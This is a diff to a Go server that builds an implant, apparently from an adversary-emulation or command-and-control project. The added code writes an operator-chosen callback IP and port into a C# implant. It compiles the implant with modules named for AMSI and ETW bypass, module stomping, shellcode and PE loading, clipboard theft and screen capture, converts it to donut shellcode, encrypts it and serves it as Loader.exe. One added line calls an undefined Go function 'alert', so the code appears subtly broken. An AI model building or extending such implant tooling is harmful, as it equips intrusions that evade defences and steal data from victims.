@@ -11,9 +11,18 @@ import (
 	"os"
 	"os/exec"
 	"runtime"
+	"strings"
 )
 
 func generateImplant(w http.ResponseWriter, r *http.Request) {
+	decoder := json.NewDecoder(r.Body)
+	var implantConfig ImplantConfig
+	errc := decoder.Decode(&implantConfig)
+	if errc != nil {
+		http.Error(w, errc.Error(), http.StatusBadRequest)
+		return
+	}
+
 	config, e := LoadConfiguration("aef-profile.json")
 	if e != nil {
 		log.Fatal("Error loading profile")
@@ -21,19 +30,46 @@ func generateImplant(w http.ResponseWriter, r *http.Request) {
 	basedirwin := config[0].BasedirWin
 	basedirlin := config[0].BasedirLin
 
+	filePath := basedirwin + "Implant\\Implant.cs"
+
+	newHost := implantConfig.IP
+	newPort := implantConfig.Port
+
+	fileContents, err := os.ReadFile(filePath)
+	if err != nil {
+		fmt.Println("Error reading file:", err)
+		return
+	}
+
+	// Convert the file contents to a string
+	contents := string(fileContents)
+
+	// Replace the lines
+	contents = strings.Replace(contents, `public static string host = "<IP>";`, `public static string host = "`+newHost+`";`, -1)
+	contents = strings.Replace(contents, `public static string port = "<PORT>";`, `public static string port = "`+newPort+`";`, -1)
+
+	// Write the updated contents back to the file
+	errw := os.WriteFile(filePath, []byte(contents), 0644)
+	if errw != nil {
+		fmt.Println("Error writing to file:", errw)
+		return
+	}
+
+	fmt.Println("File modified...")
+
 	var cmd *exec.Cmd
 	fmt.Println("[*] Hit, generating shellcode...")
-	fmt.Println("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:" + basedirwin + "donut\\Implant.exe " + basedirwin + "Implant\\Implant.cs " + basedirwin + "Implant\\Modules\\ExecuteAssembly.cs " + basedirwin + "Implant\\Modules\\Commands.cs " + basedirwin + "Implant\\Modules\\CompileAndRunNET.cs && " + basedirwin + "donut\\donut.exe -a 2 --input:" + basedirwin + "donut\\Implant.exe --output:" + basedirwin + "Encryption\\implant.bin")
+	fmt.Println("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /unsafe /out:" + basedirwin + "donut\\Implant.exe " + basedirwin + "Implant\\Implant.cs " + basedirwin + "Implant\\Modules\\ExecuteAssembly.cs " + basedirwin + "Implant\\Modules\\Commands.cs " + basedirwin + "Implant\\Modules\\CompileAndRunNET.cs " + basedirwin + "Implant\\Modules\\AmsiHBP.cs " + basedirwin + "Implant\\Modules\\ClipboardFetcher.cs " + basedirwin + "Implant\\Modules\\CodeFetch.cs " + basedirwin + "Implant\\Modules\\EtwPatch.cs " + basedirwin + "Implant\\Modules\\ModuleStomper.cs " + basedirwin + "Implant\\Modules\\PELoader.cs " + basedirwin + "Implant\\Modules\\RegisterImplant.cs " + basedirwin + "Implant\\Modules\\SCLoader.cs " + basedirwin + "Implant\\Modules\\ScreenGrab.cs " + "&& " + basedirwin + "donut\\donut.exe -a 2 --input:" + basedirwin + "donut\\Implant.exe --output:" + basedirwin + "Encryption\\implant.bin")
 	if runtime.GOOS == "windows" {
-		cmd = exec.Command("cmd", "/c", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:"+basedirwin+"donut\\Implant.exe "+basedirwin+"Implant\\Implant.cs "+basedirwin+"Implant\\Modules\\ExecuteAssembly.cs "+basedirwin+"Implant\\Modules\\Commands.cs "+basedirwin+"Implant\\Modules\\CompileAndRunNET.cs && "+basedirwin+"donut\\donut.exe -a 2 --input:"+basedirwin+"donut\\Implant.exe --output:"+basedirwin+"Encryption\\implant.bin")
+		cmd = exec.Command("cmd", "/c", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /unsafe /out:"+basedirwin+"donut\\Implant.exe "+basedirwin+"Implant\\Implant.cs "+basedirwin+"Implant\\Modules\\ExecuteAssembly.cs "+basedirwin+"Implant\\Modules\\Commands.cs "+basedirwin+"Implant\\Modules\\CompileAndRunNET.cs "+basedirwin+"Implant\\Modules\\AmsiHBP.cs "+basedirwin+"Implant\\Modules\\ClipboardFetcher.cs "+basedirwin+"Implant\\Modules\\CodeFetch.cs "+basedirwin+"Implant\\Modules\\EtwPatch.cs "+basedirwin+"Implant\\Modules\\ModuleStomper.cs "+basedirwin+"Implant\\Modules\\PELoader.cs "+basedirwin+"Implant\\Modules\\RegisterImplant.cs "+basedirwin+"Implant\\Modules\\SCLoader.cs "+basedirwin+"Implant\\Modules\\ScreenGrab.cs "+"&& "+basedirwin+"donut\\donut.exe -a 2 --input:"+basedirwin+"donut\\Implant.exe --output:"+basedirwin+"Encryption\\implant.bin")
 	} else {
 		cmd = exec.Command("/bin/sh", "-c", "mcs -out:/tmp/Implant.exe "+basedirlin+"Implant/Implant.cs && /mnt/f/capstone-adversary-emulation-tool/Implementation/donut/donut --input:/tmp/Implant.exe --output:/tmp/implant.bin")
 	}
 
-	err := cmd.Run()
+	errcc := cmd.Run()
 
-	if err != nil {
-		log.Fatal("Error: ", err)
+	if errcc != nil {
+		log.Fatal("Error: ", errcc)
 	}
 
 	fmt.Println("Encrypting the Shellcode with: AES-256 -> XOR -> Base64")
@@ -82,12 +118,39 @@ func generateImplant(w http.ResponseWriter, r *http.Request) {
 	}
 	defer file.Close()
 
+	newfilePath := basedirwin + "Implant\\Implant.cs"
+
+	currentHost := implantConfig.IP
+	currentPort := implantConfig.Port
+
+	// Read the file
+	fileContent, err := os.ReadFile(newfilePath)
+	if err != nil {
+		fmt.Println("Error reading file:", err)
+		return
+	}
+
+	// Convert the file contents to a string
+	content := string(fileContent)
+
+	// Replace the current host and port with "<IP>" and "<PORT>"
+	content = strings.Replace(content, `public static string host = "`+currentHost+`";`, `public static string host = "<IP>";`, -1)
+	content = strings.Replace(content, `public static string port = "`+currentPort+`";`, `public static string port = "<PORT>";`, -1)
+
+	// Write the updated contents back to the file
+	err = os.WriteFile(newfilePath, []byte(content), 0644)
+	if err != nil {
+		fmt.Println("Error writing to file:", err)
+		return
+	}
+
 	// Set the appropriate headers for download
 	w.Header().Set("Content-Disposition", "attachment; filename=Loader.exe")
 	w.Header().Set("Content-Type", "application/octet-stream")
 
 	// Copy the file contents to the response writer
 	io.Copy(w, file)
+	alert("Implant configured and compiled")
 }
 
 func windowsImplant(w http.ResponseWriter, r *http.Request) {
